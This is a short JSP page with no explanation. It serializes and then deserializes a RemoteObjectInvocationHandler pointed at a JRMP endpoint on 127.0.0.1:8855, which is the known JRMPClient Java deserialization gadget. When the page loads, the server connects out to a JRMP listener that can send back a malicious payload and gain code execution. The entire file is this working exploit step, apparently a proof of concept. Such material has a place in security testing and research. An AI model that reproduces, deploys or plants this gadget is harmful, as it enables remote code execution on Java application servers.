<%@page import="java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*,java.beans.*,java.lang.*,java.rmi.*,java.rmi.server.*,java.rmi.registry.*"%>
<%
String host = "127.0.0.1";
int port = 8855;

ObjID id = new ObjID((new Random()).nextInt());
sun.rmi.transport.tcp.TCPEndpoint te = new sun.rmi.transport.tcp.TCPEndpoint(host, port);
sun.rmi.server.UnicastRef ref = new sun.rmi.server.UnicastRef(new sun.rmi.transport.LiveRef(id, te, false));
RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);

ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
ObjectOutputStream outStream = new ObjectOutputStream(new BufferedOutputStream(byteArrayOutputStream));
outStream.writeObject(obj);
outStream.flush();
outStream.close();

ObjectInputStream in = new ObjectInputStream(new BufferedInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray())));
in.readObject();
%>
